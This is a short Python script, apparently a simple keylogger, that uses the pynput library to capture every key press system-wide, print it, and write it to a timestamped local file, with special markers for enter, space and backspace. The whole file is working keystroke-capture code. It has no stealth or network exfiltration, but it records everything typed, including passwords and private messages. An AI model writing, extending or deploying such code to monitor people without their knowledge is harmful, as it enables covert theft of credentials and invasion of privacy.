import datetime
import os

from pynput.keyboard import Listener

d =datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

txt = open("keylogger{}".format(d), "w")


def key_recorder(key):
    key=str(key)  
    print(key)
    if key == "Key.enter":
        txt.write("\n")
    elif key == "Key.space":
        txt.write(" ")
    elif key == "Key.backspace":
        txt.write("%BORRAR%")
    else:
         txt.write(key.replace("'", ""))

with Listener(on_press=key_recorder) as l:
    l.join()
